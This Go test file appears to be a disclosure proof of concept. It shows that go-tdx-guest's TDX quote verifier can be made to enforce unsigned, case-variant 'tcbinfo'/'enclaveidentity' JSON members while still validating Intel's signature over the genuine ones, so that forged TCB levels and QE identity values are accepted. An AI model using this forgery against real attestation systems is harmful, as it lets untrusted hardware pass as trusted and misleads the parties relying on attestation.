// PoC 1: go-tdx-guest v0.3.1 (the TDX verifier used by tinfoil-go) enforces
// TCB Info / QE Identity values parsed with encoding/json v1 (case-insensitive
// member matching, later members merge into the same struct field), but
// verifies Intel's signature over the exact-key "tcbInfo"/"enclaveIdentity"
// raw member. A body carrying an extra "tcbinfo"/"enclaveidentity" member is
// enforced but never signed.
//
// Material: Intel's real production SPR quote shipped in go-tdx-guest testdata
// (PCK chain valid until 2029) and Intel PCS collateral fetched on 2026-10-08
// (genuine Intel signatures, chained to the embedded Intel SGX Root CA).
package poc1

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/textproto"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/google/go-tdx-guest/abi"
	pb "github.com/google/go-tdx-guest/proto/tdx"
	"github.com/google/go-tdx-guest/testing/testdata"
	"github.com/google/go-tdx-guest/verify"
)

type resp struct {
	headers map[string][]string
	body    []byte
}

type getter struct{ responses map[string]resp }

func (g *getter) Get(url string) (map[string][]string, []byte, error) {
	r, ok := g.responses[url]
	if !ok {
		return nil, nil, fmt.Errorf("no captured response for %s", url)
	}
	return r.headers, bytes.Clone(r.body), nil
}

func load(t *testing.T, name string) resp {
	t.Helper()
	body, err := os.ReadFile(name + ".body")
	if err != nil {
		t.Fatal(err)
	}
	hdrs := map[string][]string{}
	f, err := os.Open(name + ".headers")
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 1<<20), 1<<20)
	for sc.Scan() {
		line := sc.Text()
		k, v, ok := strings.Cut(line, ":")
		if !ok || strings.HasPrefix(line, "HTTP/") {
			continue
		}
		hdrs[textproto.CanonicalMIMEHeaderKey(k)] = append(hdrs[textproto.CanonicalMIMEHeaderKey(k)], strings.TrimSpace(v))
	}
	return resp{headers: hdrs, body: body}
}

const (
	tcbURL    = "https://api.trustedservices.intel.com/tdx/certification/v4/tcb?fmspc=50806f000000"
	qeidURL   = "https://api.trustedservices.intel.com/tdx/certification/v4/qe/identity"
	pckcrlURL = "https://api.trustedservices.intel.com/sgx/certification/v4/pckcrl?ca=platform&encoding=der"
	rootURL   = "https://certificates.trustedservices.intel.com/IntelSGXRootCA.der"
)

func genuine(t *testing.T) map[string]resp {
	return map[string]resp{
		tcbURL:    load(t, "tcb"),
		qeidURL:   load(t, "qeid"),
		pckcrlURL: load(t, "pckcrl"),
		rootURL:   load(t, "rootcrl"),
	}
}

// addCaseVariant appends an unsigned member whose name differs from the signed
// member only by case. encoding/json v1 merges it into the same struct field;
// the signed raw member (exact key) is untouched.
func addCaseVariant(t *testing.T, body []byte, signedKey, variantKey string, override any) []byte {
	t.Helper()
	var top map[string]json.RawMessage
	if err := json.Unmarshal(body, &top); err != nil {
		t.Fatal(err)
	}
	ov, err := json.Marshal(override)
	if err != nil {
		t.Fatal(err)
	}
	// Keep the genuine signed member and signature byte-for-byte; add the
	// variant AFTER it so v1's in-place merge applies the override last.
	out := []byte(`{"` + signedKey + `":`)
	out = append(out, top[signedKey]...)
	out = append(out, []byte(`,"`+variantKey+`":`)...)
	out = append(out, ov...)
	out = append(out, []byte(`,"signature":`)...)
	out = append(out, top["signature"]...)
	out = append(out, '}')
	return out
}

func run(t *testing.T, responses map[string]resp) error {
	q, err := abi.QuoteToProto(testdata.RawQuote)
	if err != nil {
		t.Fatal(err)
	}
	opts := &verify.Options{
		Getter:           &getter{responses: responses},
		GetCollateral:    true,
		CheckRevocations: true,
		Now:              time.Now(), // real clock: PCK chain valid to 2029, collateral fetched today
		// TrustedRoots nil -> go-tdx-guest's embedded Intel SGX Root CA
	}
	return verify.TdxQuote(q.(*pb.QuoteV4), opts)
}

func TestControl_GenuineCollateral(t *testing.T) {
	err := run(t, genuine(t))
	t.Logf("genuine Intel collateral, current clock: err=%v", err)
	if err == nil {
		t.Fatalf("expected the 2023-era platform to be rejected with current Intel collateral")
	}
}

func TestForged_TcbInfoCaseVariant(t *testing.T) {
	r := genuine(t)
	// Attacker-chosen TCB levels: every TCB is "UpToDate" and matches at SVN 0.
	zeros := make([]map[string]any, 16)
	for i := range zeros {
		zeros[i] = map[string]any{"svn": 0}
	}
	forgedTcb := map[string]any{
		"tcbLevels": []any{map[string]any{
			"tcb":       map[string]any{"sgxtcbcomponents": zeros, "pcesvn": 0, "tdxtcbcomponents": zeros},
			"tcbDate":   "2026-01-01T00:00:00Z",
			"tcbStatus": "UpToDate",
		}},
		"tdxModuleIdentities": []any{map[string]any{
			"id":             "TDX_00",
			"mrsigner":       strings.Repeat("0", 96),
			"attributes":     "0000000000000000",
			"attributesMask": "FFFFFFFFFFFFFFFF",
			"tcbLevels":      []any{map[string]any{"tcb": map[string]any{"isvsvn": 0}, "tcbDate": "2026-01-01T00:00:00Z", "tcbStatus": "UpToDate"}},
		}},
	}
	tcb := r[tcbURL]
	tcb.body = addCaseVariant(t, tcb.body, "tcbInfo", "tcbinfo", forgedTcb)
	r[tcbURL] = tcb

	// Attacker-chosen QE identity: accept the quote's QE at any ISVSVN, and
	// (what a fake QE would need) any MRSIGNER / ISVPRODID the attacker wants.
	forgedQe := map[string]any{
		"tcbLevels": []any{map[string]any{"tcb": map[string]any{"isvsvn": 0}, "tcbDate": "2026-01-01T00:00:00Z", "tcbStatus": "UpToDate"}},
	}
	qe := r[qeidURL]
	qe.body = addCaseVariant(t, qe.body, "enclaveIdentity", "enclaveidentity", forgedQe)
	r[qeidURL] = qe

	err := run(t, r)
	t.Logf("forged (unsigned, case-variant) tcbinfo/enclaveidentity: err=%v", err)
	if err != nil {
		t.Fatalf("expected acceptance: %v", err)
	}
}

func TestForged_QeMrsignerIsEnforcedFromUnsignedMember(t *testing.T) {
	// Proof that enforcement reads the unsigned member: overriding only the
	// MRSIGNER via the case variant flips a (would-be) accept into a reject with
	// the QE-identity MRSIGNER error, while the signature over the genuine
	// member still verifies.
	r := genuine(t)
	tcb := r[tcbURL]
	zeros := make([]map[string]any, 16)
	for i := range zeros {
		zeros[i] = map[string]any{"svn": 0}
	}
	tcb.body = addCaseVariant(t, tcb.body, "tcbInfo", "tcbinfo", map[string]any{
		"tcbLevels": []any{map[string]any{"tcb": map[string]any{"sgxtcbcomponents": zeros, "pcesvn": 0, "tdxtcbcomponents": zeros}, "tcbDate": "2026-01-01T00:00:00Z", "tcbStatus": "UpToDate"}},
		"tdxModuleIdentities": []any{map[string]any{"id": "TDX_00", "mrsigner": strings.Repeat("0", 96), "attributes": "0000000000000000", "attributesMask": "FFFFFFFFFFFFFFFF",
			"tcbLevels": []any{map[string]any{"tcb": map[string]any{"isvsvn": 0}, "tcbDate": "2026-01-01T00:00:00Z", "tcbStatus": "UpToDate"}}}},
	})
	r[tcbURL] = tcb
	qe := r[qeidURL]
	qe.body = addCaseVariant(t, qe.body, "enclaveIdentity", "enclaveidentity", map[string]any{
		"mrsigner":  strings.Repeat("ab", 32), // attacker's fake-QE signer
		"tcbLevels": []any{map[string]any{"tcb": map[string]any{"isvsvn": 0}, "tcbDate": "2026-01-01T00:00:00Z", "tcbStatus": "UpToDate"}},
	})
	r[qeidURL] = qe
	err := run(t, r)
	t.Logf("unsigned enclaveidentity.mrsigner=abab..: err=%v", err)
	if err == nil || !strings.Contains(err.Error(), "MRSIGNER") {
		t.Fatalf("expected the MRSIGNER comparison to use the unsigned value, got %v", err)
	}
}

var _ = http.StatusOK
